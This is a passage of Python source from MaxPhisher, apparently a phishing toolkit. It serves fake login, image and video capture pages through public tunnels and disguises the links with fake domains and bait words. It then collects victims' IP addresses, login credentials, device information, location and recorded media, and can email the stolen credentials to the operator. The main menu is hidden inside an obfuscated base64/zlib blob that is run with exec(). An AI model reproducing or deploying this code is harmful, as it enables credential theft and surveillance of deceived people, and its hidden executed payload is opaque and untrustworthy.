    sed("redirectUrl", url, f"{site_dir}/login.php")

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)





# Set up ngrok authtoken to work with ngrok links
def nr_token():
    global nr_command
    while not isfile(f"{home}/.config/ngrok/ngrok.yml"):
        token = input(f"\n{ask}Enter your ngrok authtoken (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(nr_help, 0.01)
                sleep(3)
            else:
                shell(f"{nr_command} config add-authtoken {token}")
                sleep(1)
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

# Set up ngrok authtoken to work with ngrok links
def lx_token():
    global lx_command
    status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
    while "error" in status:
        token = input(f"\n{ask}Do you have loclx authtoken? (write 'help' for instructions): {green}")
        if token!="":
            if token=="help":
                sprint(lx_help, 0.01)
                sleep(3)
            if token in [ "y", "Y", "yes" ]:
                shell(f"{lx_command} account login")
                sleep(1)
                break
        else:
            print(f"\n{error}No authtoken!")
            sleep(1)
            break

def ssh_key():
    if not isfile(f"{home}/.ssh/id_rsa.pub"):
        print(f"\n{info}Press enter three times for ssh key generation{nc}\n")
        sleep(1)
        shell("ssh-keygen")
    known_hosts = cat(f"{home}/.ssh/known_hosts")
    if not "localhost.run" in known_hosts:
        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)

# Additional configuration for login phishing
def set_login():
    global url
    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_meta(metaurl)
    if url is not None:
        redirect_url = url
    else:
        redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
    write_redirect(redirect_url)

# Additional configuration for image phishing
def set_image():
    global fest, ytid
    sed("festName", fest, f"{site_dir}/index.html")
    ytid = sub("([/%+&?={} ])", "", ytid)
    sed("ytId", ytid, f"{site_dir}/index.html")

# Additional configuration for video phishing
def set_duration():
    global duration
    recordingTime = str(duration)
    sed("recordingTime", recordingTime, f"{site_dir}/recorder.js")
    

# Set redirection after data capture
def set_redirect(redir_url, write=False):
    global mask, url
    if redir_url != "":
        if url is not None:
            website = url
        else:
            website = input(f"\n{ask}Enter the url to redirect {cyan}[{purple}press enter to use default{cyan}]{blue}> {green}")
        if website == "":
            website = redir_url
        if write:
            write_meta(website)
        if mask == "":
            mask = f'https://{sub("([/%+&?={} ])", "-", sub("https?://", "", website))}'
        sed("redirectUrl", website, f"{site_dir}/index.php")


# Output urls
def url_manager(url, arg1, arg2):
    global mask
    print(f"\n{info2}{arg1} > {yellow}{url}")
    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)

    
# Copy website files from custom location
def customfol():
    global mask
    fol = input(f"\n{ask}Enter the directory > {green}")
    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
    # Remove slash and spaces from mask
    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
    if isdir(fol):
        if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html") :
            delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
            copy(fol, site_dir)
        else:
            sprint(f"\n{error}index.php/index.html required but not found!")
            return
    else:
        sprint(f"\n{error}Directory do not exists!")
        return

# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return

# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}MaxPhisher{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return


# Optional function for ngrok url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
    if cust=="":
        return
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    resp = res.split("\n")[0] if "\n" in res else res
    if "https://" not in resp:
        sprint(f"{error}Service not available!\n{error}{resp}")
        waiter()
    short = resp.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
        domain = "https://"+domain+"-"
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
    else:
        bait = sub("([/%+&?={} ])", "-", bait)+"@"
    final = domain+bait+short
    sprint(f"\n{success}Your custom url is > {bgreen}{final}")


# Staring functions

# Update of MaxPhisher
def updater():
    internet()
    if not isfile("files/maxphisher.gif"):
        return
    try:
        git_ver = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/version.txt").text.strip()
    except Exception as e:
        append(e, error_file)
        git_ver = version
    if git_ver != "404: Not Found" and float(git_ver) > float(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/KasRoudra/MaxPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}MaxPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
        upask=input(f"\n{ask}Do you want to update MaxPhisher?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell("cd .. && rm -rf MaxPhisher maxphisher && git clone https://github.com/KasRoudra/MaxPhisher")
            sprint(f"\n{success}MaxPhisher has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
    if termux:
        try:
            if not isfile(saved_file):
                mknod(saved_file)
            with open(saved_file) as checkfile:
                data = checkfile.read()
        except:
            shell("termux-setup-storage")
    internet()
    if termux:
        if not is_installed("proot"):
            sprint(f"\n{info}Installing proot{nc}")
            shell("pkg install proot -y")
    installer("php")
    if is_installed("apt") and not is_installed("pkg"):
        installer("ssh", "openssh-client")
    else:
        installer("ssh", "openssh")
    for package in packages:
        if not is_installed(package):
            sprint(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
    platform = osinfo.system.lower()
    architecture = osinfo.machine
    isngrok = isfile(f"{tunneler_dir}/ngrok")
    iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
    isloclx = isfile(f"{tunneler_dir}/loclx")
    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
    internet()
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
        elif "arm" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
        elif "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
        else:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
        if isfile("ngrok.tgz"):
            extract("ngrok.tgz", f"{tunneler_dir}")
            remove("ngrok.tgz")
    elif "darwin" in platform:
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                extract("cloudflared.tgz", f"{tunneler_dir}")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
        elif "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
                print(f"{error}Device architecture unknown. Download cloudflared manually!")
            if not isloclx:
                download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
        else:
            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
            sleep(3)
    else:
        print(f"{error}Device not supported!")
        exit(1)
    if isfile("loclx.zip"):
        extract("loclx.zip", f"{tunneler_dir}")
        remove("loclx.zip")
    for tunneler in tunnelers:
        if isfile(f"{tunneler_dir}/{tunneler}"):
            shell(f"chmod +x $HOME/.tunneler/{tunneler}")
    for process in processes:
        if is_running(process):
            print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
            pexit()
    if is_installed("ngrok"):
        nr_command = "ngrok"
    if is_installed("cloudflared"):
        cf_command = "cloudflared"
    if is_installed("localxpose"):
        lx_command = "localxpose"
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        print(f"\n{info}Copying website files....")
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if isdir("sites"):
        print(f"\n{info}Copying website files....")
        copy("sites", sites_dir)
    if isfile(f"{sites_dir}/version.txt"):
        with open(f"{sites_dir}/version.txt", "r") as sites_file:
            zipver=sites_file.read().strip()
            if float(version) > float(zipver):
                download(websites_url, "websites.zip")
    else:
        download(websites_url, "websites.zip")
    if isfile("websites.zip"):
        delete(sites_dir, recreate=True)
        extract("websites.zip", sites_dir)
        remove("websites.zip")
    if mode != "test":
        nr_token()
        lx_token()
        ssh_key()
    email_config = cat(email_file)
    if is_json(email_config):
        email_json = parse(email_config)
        email = email_json["email"]
        password = email_json["password"]
        receiver = email_json["receiver"]
        # As the server is of gmail, we only allow gmail login
        if "@gmail.com" in email:
            is_mail_ok = True
        else:
            print(f"\n{error}Only gmail with app password is allowed")
            sleep(1)

        
# Main Menu to choose phishing type
_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'=I0ZwmyA//73Pb/dPCNP5lrwW0suKt9+uHNmBSgY4jGa9WIFBJqgzIVpivBNKHtcIk29qf33DcP5EVuAT3tXxuIVgGtENy27K4KfM5z1QeuvmiqweYN/5xqbORxAnIzS6sOvAL8EoEl9qPGvzAxgdiR0cU95EM7gaRxFNSEpCJxL8GDcHPhP8SkXx/7iraBdJEYYyZXRSYb8JyLH1foUYkJ6RDaxPsC33ThuNIm3xDz31ozVPp6v1oDN76OfE5jPDfj++cvsPzl97ijIfYntIhNy2Lox9RHVKtVUIGnW9GKwkLXUB45yFIfkDW/jrrlmLnsiyXsTD1lHJTr1J2afgk3J5ZU7yW8tcJKcJJBFZaO7PWM/hxOMtBTVuNt9RJlp7MsNpieFFOq1iTioWjtWMIkjs1C4epRaJtw4I3qd/yjtjw5fUd4EQkd9WL2pLzKSIDvLzngXQOqOYaPZvHkb0wfkMP8n/cfoJ1xK9gt6P6qUiQ+WoALYUdEqHZZ2MWTcN6u7dBMZ6klMmBeS6agq8mZ3SHG63qzvf8ab4Y0w0U0n16QZ5wNaUglMdbGI9xs5To79s5Ps3Co6USfHG0LnsyDrDTqS+tUeq1ATxaXRPEVc9uWy4j6nnW0HBydykjGJ8WnuND53PyFpbXepc/d3qGOw60MVpcoK4W9PEuvdCtkLWR6t/EjiqFSzdxFdeSwmEdMC7EtbbGWy556eo4g8ilMs8TfrW0PGpBg9LnPcbdROoq/Ukgwm2Cpt8Ak2HzolaBhKr9RKcd3l5ROzvkvcsItN9tV3Bc4ySEL8SBzMzd5M+yU5i7S4kH87pSixE18jKgGcW3ad/9cg8i4IpdMPRPHfH4t6j9ZzfJGFIU2TyI+02oz5kVLpYyMaLQ5cxKTBmndblzsNBrV+B95bzUftfewUhW3koBe/+q3pKYK8mwZX71wv7RcBGO4FICvcJOcNl/DpfaEKlJbYy2cxjrWQt5Tink1G7jPd4/1eQTUw4Qk4bWYXhw0nxhNGrGO/f9DzTPIHfXK2DV/GI8BwyoK10PJ0S1tH1ZEj3AhelI8F5J29Z1vngkipmktXgxPJwkzsKDX4oXKVr5TFz+JQ7/hT220E9QDkzJQ3Xc+Gbsaa81TOqUa98aenUv3tTnMOI9AJhMXSUQSxOFrxhix2H3j2PGxisZKd4E3SKIKQsj4Kvyq1rhPNbgBMxj7GUT7dAA0WRv8YpI9432YfpA9UMfqJp7TBcz1XCds3KKrn/s0TQO5w/PBVE+k0mPg9ZhE/lgdKjxFJ3NsCdXf09AjqsL3Cy04rTyM/7V23YCm7tmqRw5/3pViC0fg1XAs8WGNx3elRvmjD4HvzOfvYsrds0bY+iwco0T1lPt0rYwbHfVyGddje/yhceYuVNViknHTAEmLpQipERgKrTu4125rn1IbPMvFFMGV8QQLfpr5OmRRVUp5xkbzOuz3nT5rVzjHK+cCgpvWMpGgIQIZZwjHVqjlGzX+2w/Nf0bQOav1+oz2dlBla7oHan2x6KWmg3Kmcl4T050AJu+V0VQC6OqaRGnJUJe8ZQoEMeWKMh7WtofU7c4pTWc+3b+SA0R7rEB2VibXj4xh2YNaHdduhZNjKpXfIgdwkQrtGXv5XacazG0zHJcvdS+hHCbLrsbA6qyiEBIwQ83h9nRC+Gofo7a5fWJ9GrlPX50D0cxuvxa/Mf7Rh62aQLUCC1AWrhxDRSjNvqyYf77htWFfhFculBjIgB33r7Izci8rDoumA+iccx0nrO3jI1M6jj/XxBaldsThxjZSJvk608Y96d71fVC2uIucWAwT0jfc8HDCpDGf+/9J+f++75zv/LNjsav7qgy1nnuzuFODZQcCBgvYMvJwQCzyX87MPAg1qSUUVNwJe'))
# Start server and tunneling
def server():
    global mode
    clear()
    # Termux requires hotspot in some android
    if termux:
        sprint(f"\n{info}If you haven't enabled hotspot, please enable it!")
        sleep(2)
    sprint(f"\n{info2}Initializing PHP server at localhost:{port}....")
    for logfile in [php_file, cf_file, lx_file, lhr_file]:
        delete(logfile)
        if not isfile(logfile):
            mknod(logfile)
    php_log = open(php_file, "w")
    cf_log = open(cf_file, "w")
    lx_log = open(lx_file, "w")
    lhr_log = open(lhr_file, "w")
    internet()
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    try:
        status_code = get(f"http://{local_url}").status_code
    except Exception as e:
        append(e, error_file)
        status_code = 400
    if status_code <= 400:
        sprint(f"\n{info}PHP Server has started successfully!")
    else:
        sprint(f"\n{error}PHP Error! Code: {status_code}")
        pexit()
    sprint(f"\n{info2}Initializing tunnelers at same address.....")
    internet()
    arguments = ""
    if region is not None:
        arguments = f"--region {region}"
    if subdomain is not None:
        arguments = f"{arguments} --subdomain {subdomain}"
    bgtask(f"{nr_command} http {arguments} {local_url}")
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
    bgtask(f"ssh -R 80:{local_url} localhost.run -T", stdout=lhr_log, stderr=lhr_log)
    sleep(10)
    try:
        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
        nr_url = nr_api["tunnels"][0]["public_url"]
    except Exception as e:
        append(e, error_file)
        nr_url = ""
    if nr_url != "":
        nr_success=True
    else:
        nr_success=False
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        sleep(1)
    lx_success = False
    for i in range(10):
        lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
        if lx_url != "https://":
            lx_success = True
            break
        sleep(1)
    lhr_success = False
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhrtunnel.link)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        sleep(1)
    if nr_success or cf_success or lx_success or lhr_success:
        if mode == "test":
            print(f"\n{info}URL Generation completed successfully!")
            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
            pexit()
        sprint(f"\n{info}Your urls are given below:")
        if nr_success:
            url_manager(nr_url, "Ngrok", "NR Masked")
        if cf_success:
            url_manager(cf_url, "CloudFlared", "CF Masked")
        if lx_success:
            url_manager(lx_url, "LocalXpose", "LX Masked")
        if lhr_success:
            url_manager(lhr_url, "LocalHR", "LHR Masked")
        if nr_success and tunneler.lower() == "ngrok":
            masking(nr_url)
        elif lx_success and tunneler.lower() == "loclx":
            masking(lx_url)
        elif lhr_success and tunneler.lower() == "localhostrun":
            masking(lhr_url)
        elif cf_success and tunneler.lower() == "cloudflared":
            masking(cf_url)
        else:
            print(f"\n{error}URL masking not available for {tunneler}!{nc}")
    else:
        sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
        if mode == "test":
            exit(1)
    waiter()

# Last function capturing credentials
def waiter():
    global is_mail_ok
    delete(ip_file, cred_file, log_file)
    for file in get_media():
        remove(file)
    sprint(f"\n{info}{blue}Waiting for login info....{cyan}Press {red}Ctrl+C{cyan} to exit")
    try:
        while True:
            if isfile(ip_file):
                print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                show_file_data(ip_file)
                ipdata = cat(ip_file)
                append(ipdata, main_ip)
                # Just add the ip
                append(ipdata.split("\n")[0], saved_file)
                print(f"\n{info2}Saved in {main_ip}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(ip_file)
            if isfile(cred_file):
                print(f"\n\n{success}{bgreen}Victim login info found!\n\007")
                show_file_data(cred_file)
                userdata = cat(cred_file)
                if is_mail_ok:
                    send_mail(userdata)
                append(userdata, main_cred)
                append(userdata, saved_file)
                add_json(text2json(userdata), cred_json)
                print(f"\n{info2}Saved in {main_cred}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(cred_file)
            if isfile(info_file):
                print(f"\n\n{success}{bgreen}Victim Info found!\n\007")
                show_file_data(info_file)
                info_data = cat(info_file)
                append(info_data, main_info)
                add_json(text2json(info_data), info_json)
                print(f"\n{info2}Saved in {main_info}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(info_file)
            if isfile(location_file):
                print(f"\n\n{success}{bgreen}Victim Location found!\n\007")
                show_file_data(location_file)
                location_data = cat(location_file)
                append(location_data, main_location)
                add_json(text2json(location_data), location_json)
                print(f"\n{info2}Saved in {main_location}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                remove(location_file)
            if isfile(log_file):
                print(f"\n{success}{bgreen}Media file captured!\007")
                for file in get_media():
                    copy(file, directory)
                    remove(file)
                    print(f"\n{info2}{green}{basename(file)} {cyan}saved in {green}{directory}")
                print(f"\n{info}{blue}Waiting for next.....{cyan}Press {red}Ctrl+C{cyan} to exit")
                if get_media()==[]:
                    remove(log_file)
            sleep(0.75)
    except KeyboardInterrupt:
        pexit()

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        pexit()
    except Exception as e:
        try:
            exception_handler(e, True, False)
        except:
            exit()
            
# If this code helped you, consider staring repository. Your stars encourage me a lot!
